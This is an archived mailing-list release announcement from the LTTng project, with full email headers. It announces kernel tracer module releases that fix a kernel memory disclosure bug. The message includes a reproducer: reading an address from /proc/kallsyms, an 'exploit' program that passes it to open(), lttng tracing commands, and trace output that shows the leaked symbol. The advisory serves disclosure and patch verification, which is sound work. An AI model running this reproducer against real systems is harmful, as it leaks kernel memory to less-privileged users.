Return-Path: <SRS0=raw4=DM=lists.lttng.org=lttng-dev-bounces@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-3.9 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,
	SPF_HELO_NONE,SPF_PASS,URIBL_BLOCKED autolearn=no autolearn_force=no
	version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id F2A6DC4363A
	for <lttng-dev@archiver.kernel.org>; Mon,  5 Oct 2020 21:12:40 +0000 (UTC)
Received: from lists.lttng.org (lists.lttng.org [167.114.26.123])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 257BA2078E
	for <lttng-dev@archiver.kernel.org>; Mon,  5 Oct 2020 21:12:39 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=pass (2048-bit key) header.d=lists.lttng.org header.i=@lists.lttng.org header.b="M+AdgQ2j"
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 257BA2078E
Authentication-Results: mail.kernel.org; dmarc=pass (p=none dis=none) header.from=lists.lttng.org
Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=lttng-dev-bounces@lists.lttng.org
Received: from lists-lttng01.efficios.com (localhost [IPv6:::1])
	by lists.lttng.org (Postfix) with ESMTP id 4C4tbV2xyGzRV9;
	Mon,  5 Oct 2020 17:12:38 -0400 (EDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=lists.lttng.org;
	s=default; t=1601932359;
	bh=9YeLUjKhWz1OgNthlOxdkk+nTag6v7JsrdO0ySMcYtI=;
	h=Date:To:Subject:List-Id:List-Unsubscribe:List-Archive:List-Post:
	 List-Help:List-Subscribe:From:Reply-To:From;
	b=M+AdgQ2jKdi+p2IGFIpLS8KhxyrDDQYQtPMOszgH8xtvEJ96BpqHryVCZDsnMXZ7T
	 tR29uohPqznWev+w3t0CFd3u4bJfLZWiIXdQvJmGeK0Hfeu+YPfmCNkglflVM4KFpJ
	 gt4XM3szOzJ/wUiPKDrzQlaKmqF5Foq4avi14uRJrhV2/bLYqXV4jjEpjhj7J7CO8f
	 xSvSAwPYIZ5xBs9eUp6yZodz5QtJ34S7TkXfwTHbb4vYvhzaTvnrp2lQ/MJuBl0lyX
	 yTumAHqvkOl6+CJrwaONFEb9hQSuCsG3fykLfZK7rOq9zn8ZHmHUxaU8cIci3cuImG
	 n2rOGD4B/Tu9A==
Received: from mail.efficios.com (mail.efficios.com [167.114.26.124])
 by lists.lttng.org (Postfix) with ESMTPS id 4C4tbT0sHKzQws
 for <lttng-dev@lists.lttng.org>; Mon,  5 Oct 2020 17:12:37 -0400 (EDT)
Received: from localhost (localhost [127.0.0.1])
 by mail.efficios.com (Postfix) with ESMTP id C99A62466D0
 for <lttng-dev@lists.lttng.org>; Mon,  5 Oct 2020 17:12:30 -0400 (EDT)
Received: from mail.efficios.com ([127.0.0.1])
 by localhost (mail03.efficios.com [127.0.0.1]) (amavisd-new, port 10032)
 with ESMTP id Hf10uEkEsVOW; Mon,  5 Oct 2020 17:12:30 -0400 (EDT)
Received: from localhost (localhost [127.0.0.1])
 by mail.efficios.com (Postfix) with ESMTP id 76789246799;
 Mon,  5 Oct 2020 17:12:30 -0400 (EDT)
DKIM-Filter: OpenDKIM Filter v2.10.3 mail.efficios.com 76789246799
X-Virus-Scanned: amavisd-new at efficios.com
Received: from mail.efficios.com ([127.0.0.1])
 by localhost (mail03.efficios.com [127.0.0.1]) (amavisd-new, port 10026)
 with ESMTP id 5mJcgMKitmH8; Mon,  5 Oct 2020 17:12:30 -0400 (EDT)
Received: from mail03.efficios.com (mail03.efficios.com [167.114.26.124])
 by mail.efficios.com (Postfix) with ESMTP id 6360824662E;
 Mon,  5 Oct 2020 17:12:30 -0400 (EDT)
Date: Mon, 5 Oct 2020 17:12:30 -0400 (EDT)
To: lttng-dev@lists.lttng.org, diamon-discuss@lists.linuxfoundation.org, 
 linux-trace-users@vger.kernel.org, lwn@lwn.net, 
 linux-kernel@vger.kernel.org
Message-ID: <1413973086.8258.1601932350315.JavaMail.zimbra@efficios.com>
MIME-Version: 1.0
X-Originating-IP: [167.114.26.124]
X-Mailer: Zimbra 8.8.15_GA_3968 (ZimbraWebClient - FF81 (Linux)/8.8.15_GA_3968)
Thread-Index: vjTqqbv2yEVXycLsMDpnieqt0uH3CA==
Thread-Topic: LTTng-modules 2.12.3 and 2.11.6 (Linux kernel tracer) (security
 fix)
Subject: [lttng-dev] [RELEASE] LTTng-modules 2.12.3 and 2.11.6 (Linux kernel
 tracer) (security fix)
X-BeenThere: lttng-dev@lists.lttng.org
X-Mailman-Version: 2.1.31
Precedence: list
List-Id: LTTng development list <lttng-dev.lists.lttng.org>
List-Unsubscribe: <https://lists.lttng.org/cgi-bin/mailman/options/lttng-dev>, 
 <mailto:lttng-dev-request@lists.lttng.org?subject=unsubscribe>
List-Archive: <https://lists.lttng.org/pipermail/lttng-dev>
List-Post: <mailto:lttng-dev@lists.lttng.org>
List-Help: <mailto:lttng-dev-request@lists.lttng.org?subject=help>
List-Subscribe: <https://lists.lttng.org/cgi-bin/mailman/listinfo/lttng-dev>, 
 <mailto:lttng-dev-request@lists.lttng.org?subject=subscribe>
From: Mathieu Desnoyers via lttng-dev <lttng-dev@lists.lttng.org>
Reply-To: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: lttng-dev-bounces@lists.lttng.org
Sender: "lttng-dev" <lttng-dev-bounces@lists.lttng.org>

Hi,

These releases include a security fix for the LTTng kernel tracer.

This issue was introduced very early in the LTTng modules 2.0 development,
prior to the lttng-modules v2.0.0 release. Therefore all lttng-modules
releases are affected. Users are encouraged to upgrade.

See master branch commit (6f192a1604ec "fix: don't allow userspace copy to read kernel memory")
    
    This patch fixes a security issue which allows the root user to read
    arbitrary kernel memory. Considering the security model used in LTTng
    userspace tooling for kernel tracing, this bug also allows members of
    the 'tracing' group to read arbitrary kernel memory.
    
    Calls to __copy_from_user_inatomic() where wrongly enclosed in
    set_fs(KERNEL_DS) defeating the access_ok() calls and allowing to read
    from kernel memory if a kernel address is provided.
    
    Remove all set_fs() calls around __copy_from_user_inatomic().
    
    As a side effect this will allow us to support v5.10 which should remove
    set_fs().

You will find below details on how to reproduce this issue to check whether
your version of lttng-modules is vulnerable or not.

While reviewing this code, we also noticed that the lttng_strlen_user_inatomic
could theoretically cause a long preemption-off critical section because it is
an unbounded loop. We added an arbitrary 1MB size limit to the size of user
strings to prevent this. It can be found as
master branch commit (eb94dcd91d4e "fix: Add a 1MB limit to lttng_strlen_user_inatomic")

A fix for the system call filter table was introduced, which should speed up
system call tracing when only specific system calls are selected.
master branch commit (badfe9f5c396e "Fix: system call filter table")

Besides this, commits adding support for Linux kernel 5.9, as well as newer Ubuntu
kernels were integrated into the 2.12.3 and 2.11.6 releases.

Finally, a fix for dependency issue when building LTTng-modules within the
Linux kernel tree without CONFIG_FTRACE was integrated.

Security issue (kernel memory disclosure to root user and 'tracing' group)
reproducer:

cat /proc/kallsyms
[...]
ffffffffaa9c3f81 r __kstrtab_sunrpc_cache_update
[...]

Create userspace program 'exploit' issuing:

  open((void*)(uintptr_t)0xffffffffaa9c3f81, 0);

Run lttng-sessiond as root.

Then trace as tracing group user:

lttng create
lttng enable-event -k --syscall 'openat'
lttng add-context -k -t procname
lttng start

Run 'exploit' program as unprivileged user.

lttng stop
lttng view | grep exploit | tail -n 2

In the "Vulnerable" case, the symbol name can be found in the filename field
of the openat event in the trace. With the fix, an empty string is saved in the
filename field instead. Vulnerable case:

[17:02:57.265276947] (+0.000960778) compudjdev syscall_entry_openat: { cpu_id = 22 }, { procname = "exploit" }, { dfd = -100, filename = "sunrpc_cache_update", flags = ( "O_RDONLY" : container = 0 ), mode = ( <unknown> : container = 0 ) }
[17:02:57.265284413] (+0.000007466) compudjdev syscall_exit_openat: { cpu_id = 22 }, { procname = "exploit" }, { ret = -14 }

With fix:

[16:58:51.229342728] (+0.000906591) compudjdev syscall_entry_openat: { cpu_id = 22 }, { procname = "exploit" }, { dfd = -100, filename = "", flags = ( "O_RDONLY" : container = 0 ), mode = ( <unknown> : container = 0 ) }
[16:58:51.229348988] (+0.000006260) compudjdev syscall_exit_openat: { cpu_id = 22 }, { procname = "exploit" }, { ret = -14 }

Thanks,

Mathieu

Project website: https://lttng.org
Documentation: https://lttng.org/docs
Download link: https://lttng.org/download

-- 
Mathieu Desnoyers
EfficiOS Inc.
http://www.efficios.com
_______________________________________________
lttng-dev mailing list
lttng-dev@lists.lttng.org
https://lists.lttng.org/cgi-bin/mailman/listinfo/lttng-dev
